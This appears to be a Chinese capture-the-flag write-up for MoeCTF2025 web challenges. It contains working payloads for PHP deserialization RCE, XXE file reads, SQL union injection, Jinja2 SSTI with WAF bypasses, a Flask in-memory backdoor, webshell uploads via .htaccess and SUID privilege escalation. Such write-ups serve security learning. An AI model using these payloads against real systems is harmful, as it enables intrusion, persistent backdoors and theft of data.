+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$flag = getenv(&#x27;FLAG&#x27;);</span><br><span class="line"></span><br><span class="line">$a = $_GET[&quot;a&quot;] ?? &quot;&quot;;</span><br><span class="line">$b = $_GET[&quot;b&quot;] ?? &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if($a == $b)&#123;</span><br><span class="line">    die(&quot;error 1&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(md5($a) != md5($b))&#123;</span><br><span class="line">    die(&quot;error 2&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag</span><br></pre></td></tr></table></figure>
+
+<p>md5碰撞，?a&#x3D;QNKCDZO&amp;b&#x3D;240610708，这一题使用数组绕过会报错只能碰撞</p>
+<h2 id="09-第九章-星墟禁制·天机问路"><a href="#09-第九章-星墟禁制·天机问路" class="headerlink" title="09 第九章 星墟禁制·天机问路"></a><strong>09 第九章 星墟禁制·天机问路</strong></h2><p>?url&#x3D;;env</p>
+<h2 id="13-第十三章-通幽关·灵纹诡影"><a href="#13-第十三章-通幽关·灵纹诡影" class="headerlink" title="13 第十三章 通幽关·灵纹诡影"></a><strong>13 第十三章 通幽关·灵纹诡影</strong></h2><p>考察文件上传，需要注意的就是他校验的是十六进制校验码，可以抓包直接在bp中修改</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126132050894.png" alt="image-20260126132050894"></p>
+<p>改后缀然后就可以上传了</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126132212402.png" alt="image-20260126132212402"></p>
+<h2 id="17-第十七章-星骸迷阵·神念重构"><a href="#17-第十七章-星骸迷阵·神念重构" class="headerlink" title="17 第十七章 星骸迷阵·神念重构"></a><strong>17 第十七章 星骸迷阵·神念重构</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new A();</span><br><span class="line"></span><br><span class="line">$obj-&gt;a = &quot;system(&#x27;ls /&#x27;);&quot;;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($obj));</span><br></pre></td></tr></table></figure>
+
+<h2 id="10-第十章-天机符阵-revenge"><a href="#10-第十章-天机符阵-revenge" class="headerlink" title="10 第十章 天机符阵_revenge"></a><strong>10 第十章 天机符阵_revenge</strong></h2><p>依旧啊</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file:///flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;输出&gt;&amp;file;&lt;/输出&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="14-第十四章-御神关·补天玉碑"><a href="#14-第十四章-御神关·补天玉碑" class="headerlink" title="14 第十四章 御神关·补天玉碑"></a><strong>14 第十四章 御神关·补天玉碑</strong></h2><p>省流：先上传.htaccess再上传图片码，然后蚁剑连接</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126144533157.png" alt="image-20260126144533157">**</p>
+<h2 id="18-第十八章-万卷诡阁·功法连环"><a href="#18-第十八章-万卷诡阁·功法连环" class="headerlink" title="18 第十八章 万卷诡阁·功法连环"></a><strong>18 第十八章 万卷诡阁·功法连环</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="title function_ invoke__">work</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA &#123;</span><br><span class="line">    private $name;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;name = new PersonB();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class PersonB &#123;</span><br><span class="line">    public $name=&quot;system(&#x27;ls /&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new PersonA()));</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p>O%3A7%3A%22PersonA%22%3A1%3A%7Bs%3A13%3A%22%00PersonA%00name%22%3BO%3A7%3A%22PersonB%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D%7D</p>
+<p>然后cat &#x2F;flag就行了</p>
+<h2 id="20-第二十章-幽冥血海·幻语心魔"><a href="#20-第二十章-幽冥血海·幻语心魔" class="headerlink" title="20 第二十章 幽冥血海·幻语心魔"></a><strong>20 第二十章 幽冥血海·幻语心魔</strong></h2><p>考察ssti，先尝试用49发现回显49</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126151504265.png" alt="image-20260126151504265"> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="08-第八章-天衍真言，星图显圣"><a href="#08-第八章-天衍真言，星图显圣" class="headerlink" title="08 第八章 天衍真言，星图显圣"></a><strong>08 第八章 天衍真言，星图显圣</strong></h2><p>联合查询，判断回显位</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126173147294.png" alt="image-20260126173147294"></p>
+<p>然后一次查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select group_concat(column_name),2 from information_schema.columns where table_name=&#x27;flag&#x27;--+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select group_concat(value),2 from flag--+&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<h2 id="11-第十一章-千机变·破妄之眼"><a href="#11-第十一章-千机变·破妄之眼" class="headerlink" title="11 第十一章 千机变·破妄之眼"></a><strong>11 第十一章 千机变·破妄之眼</strong></h2><p>参数等于参数值，由m,n,o,p,q组成，先准备好字典爆破就行了，爆破的非常慢，最后是?omnqp&#x3D;omnqp，由3个文件，读一下flag.php</p>
+<p>他说flag就在这，伪协读一下</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126180822727.png" alt="image-20260126180822727"></p>
+<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126181011847.png" alt="image-20260126181011847"></p>
+<h2 id="摸金偶遇FLAG，拼尽全力难战"><a href="#摸金偶遇FLAG，拼尽全力难战" class="headerlink" title="摸金偶遇FLAG，拼尽全力难战"></a><strong>摸金偶遇FLAG，拼尽全力难战</strong></h2><p>俺不是三角洲的兵</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">// 穿透layui闭包获取密码和token</span><br><span class="line">layui.use([&quot;element&quot;, &quot;form&quot;, &quot;util&quot;, &quot;slider&quot;], function () &#123;</span><br><span class="line">    // 遍历layui的上下文，找到存储realCode和myToken的作用域</span><br><span class="line">    const scriptTags = document.querySelectorAll(&#x27;script&#x27;);</span><br><span class="line">    let realCode = null;</span><br><span class="line">    let myToken = null;</span><br><span class="line"></span><br><span class="line">    // 方案A：直接从layui的回调作用域中提取（优先）</span><br><span class="line">    try &#123;</span><br><span class="line">        // 重写layui.use，捕获闭包内的变量</span><br><span class="line">        const originalUse = layui.use;</span><br><span class="line">        layui.use = function (modules, callback) &#123;</span><br><span class="line">            originalUse.call(layui, modules, function () &#123;</span><br><span class="line">                callback.apply(this, arguments);</span><br><span class="line">                // 尝试从当前作用域获取变量</span><br><span class="line">                if (window.realCode === undefined &amp;&amp; this.realCode) &#123;</span><br><span class="line">                    window.realCode = this.realCode;</span><br><span class="line">                    window.myToken = this.myToken;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        // 触发重新初始化（确保变量挂载到全局）</span><br><span class="line">        generateRandomDigitArray = window.generateRandomDigitArray || function(length) &#123;</span><br><span class="line">            return fetch(`/get_challenge?count=$&#123;length&#125;`)</span><br><span class="line">                .then(r =&gt; r.json())</span><br><span class="line">                .then(data =&gt; &#123;</span><br><span class="line">                    window.realCode = data.numbers;</span><br><span class="line">                    window.myToken = data.token;</span><br><span class="line">                    return &#123; real: data.numbers, guess: Array(length).fill(null) &#125;;</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        // 重新获取密码（强制刷新）</span><br><span class="line">        generateRandomDigitArray(9).then((&#123; real &#125;) =&gt; &#123;</span><br><span class="line">            console.log(&quot;✅ 当前页面正确密码：&quot;, real.join(&quot;&quot;));</span><br><span class="line">            console.log(&quot;✅ 验证token：&quot;, window.myToken);</span><br><span class="line">            // 自动提交拿FLAG</span><br><span class="line">            fetch(&quot;/verify&quot;, &#123;</span><br><span class="line">                method: &quot;POST&quot;,</span><br><span class="line">                headers: &#123; &quot;Content-Type&quot;: &quot;application/json&quot; &#125;,</span><br><span class="line">                body: JSON.stringify(&#123; answers: real, token: window.myToken &#125;)</span><br><span class="line">            &#125;).then(r =&gt; r.json()).then(data =&gt; &#123;</span><br><span class="line">                console.log(&quot;🏆 破译成功，FLAG：&quot;, data.flag || &quot;未返回FLAG，请检查接口&quot;);</span><br><span class="line">                alert(&quot;FLAG：&quot; + (data.flag || &quot;未获取到FLAG&quot;));</span><br><span class="line">            &#125;).catch(e =&gt; console.error(&quot;❌ 提交失败：&quot;, e));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        console.error(&quot;❌ 方案A失败，尝试方案B：&quot;, e);</span><br><span class="line">        </span><br><span class="line">        // 方案B：直接调用/get_challenge接口获取密码</span><br><span class="line">        fetch(&quot;/get_challenge?count=9&quot;)</span><br><span class="line">            .then(r =&gt; &#123;</span><br><span class="line">                if (!r.ok) throw new Error(&quot;接口请求失败&quot;);</span><br><span class="line">                return r.json();</span><br><span class="line">            &#125;)</span><br><span class="line">            .then(data =&gt; &#123;</span><br><span class="line">                if (data.error) throw new Error(data.error);</span><br><span class="line">                window.realCode = data.numbers;</span><br><span class="line">                window.myToken = data.token;</span><br><span class="line">                console.log(&quot;✅ 方案B - 正确密码：&quot;, data.numbers.join(&quot;&quot;));</span><br><span class="line">                console.log(&quot;✅ 方案B - token：&quot;, data.token);</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(err =&gt; console.error(&quot;❌ 方案B失败：&quot;, err));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="15-第十五章-归真关·竞时净魔"><a href="#15-第十五章-归真关·竞时净魔" class="headerlink" title="15 第十五章 归真关·竞时净魔"></a><strong>15 第十五章 归真关·竞时净魔</strong></h2><p>考察条件竞争</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127185925933.png" alt="image-20260127185925933"></p>
+<p>一边上传一遍访问，一直刷新知道回显出phpinfo的内容</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127190326884.png" alt="image-20260127190326884"></p>
+<h2 id="19-第十九章-revenge"><a href="#19-第十九章-revenge" class="headerlink" title="19 第十九章_revenge"></a><strong>19 第十九章_revenge</strong></h2><p>还是反序列化，exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new PersonA();</span><br><span class="line">$a-&gt;name=new PersonC();</span><br><span class="line">$a-&gt;id=&quot;check&quot;;</span><br><span class="line">$a-&gt;age=&#x27;env&#x27;;</span><br><span class="line">$a-&gt;name-&gt;name=&quot;passthru&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">#PersonA::__destruct()-&gt;PersonC::check()</span><br></pre></td></tr></table></figure>
+
+<h2 id="21-第二十一章-往生漩涡·言灵死局"><a href="#21-第二十一章-往生漩涡·言灵死局" class="headerlink" title="21 第二十一章 往生漩涡·言灵死局"></a><strong>21 第二十一章 往生漩涡·言灵死局</strong></h2><p>这一题多了waf，过分别绕过即可</p>
+<p>用*<code>&#123;%print %&#125;</code>*，globals可以字符串拼接，__可以用用十六进制\x5f，或者分成两个短下划线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print lipsum[&quot;\x5f\x5fglo&quot;&quot;bals\x5f\x5f&quot;][&#x27;os&#x27;].[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()%&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="22-第二十二章-血海核心·千年手段"><a href="#22-第二十二章-血海核心·千年手段" class="headerlink" title="22 第二十二章 血海核心·千年手段"></a><strong>22 第二十二章 血海核心·千年手段</strong></h2><p>这一题首先测试49,发现回显也是这个并没有渲染，看源代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">           login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">           &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">               &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">               &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">           &lt;/div&gt;</span></span><br><span class="line"><span class="string">           &quot;&quot;&quot;</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           login_msg = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">           &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">               &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">               &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;Welcome: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">           &lt;/div&gt;</span></span><br><span class="line"><span class="string">           &quot;&quot;&quot;</span></span><br><span class="line">           render_template_string(login_msg)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       login_msg = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, login_msg=login_msg)</span><br></pre></td></tr></table></figure>
+
+<p>这里输入了49,也执行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(login_msg)</span><br></pre></td></tr></table></figure>
+
+<p>但是仅仅只是执行了，但是最后输出的的却还是原来的。这里对比一下前面的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_msg = render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;欢迎: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        login_msg = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, login_msg=login_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到不同的是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_msg = render_template_string(</span><br></pre></td></tr></table></figure>
+
+<p>这个输出到页面的是渲染后的，而本题是渲染了，但是输出的还是原字符串。这也就是无回显ssti。看了几个wp，就是用两种方法，一种是通过<code>static/</code>回显，一种是通过内存马，这一题由于后面还有提取，用内存马会方便一点。</p>
+<p>这里先说内存马，这里找的基础款，payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;sys&#x27;].modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以rce了</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126214925848.png" alt="image-20260126214925848"></p>
+<p>读取flag发现没有回显，环境变量也没有，这是就考虑是不是权限问题，首先看看whoami</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126215217474.png" alt="image-20260126215217474"></p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126215521068.png" alt="image-20260126215521068"></p>
+<p>接下来就要提权</p>
+<p>find &#x2F; -perm -4000 -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126215757592.png" alt="image-20260126215757592"></p>
+<p>接下就是分析rev，首先base64编码读取</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126220915606.png" alt="image-20260126220915606"></p>
+<p>然后再解码保存</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126220955381.png" alt="image-20260126220955381"></p>
+<p>ida逆向分析</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126221023105.png" alt="image-20260126221023105"></p>
+<p>代码的意思就是遍历命令行参数，寻找特定的触发选项 <code>--HDds</code>一旦找到，就执行该选项后面紧跟的那个参数作为新的系统命令</p>
+<p>那就好说了</p>
+<p>?cmd&#x3D;&#x2F;usr&#x2F;bin&#x2F;rev%20%20–HDdss%20cat%20&#x2F;flag</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126221256431.png" alt="image-20260126221256431"></p>
+<p>还有就是static&#x2F;回显，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static; ls / &gt; ./static/out.txt&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个也要提取就不多说了。</p>
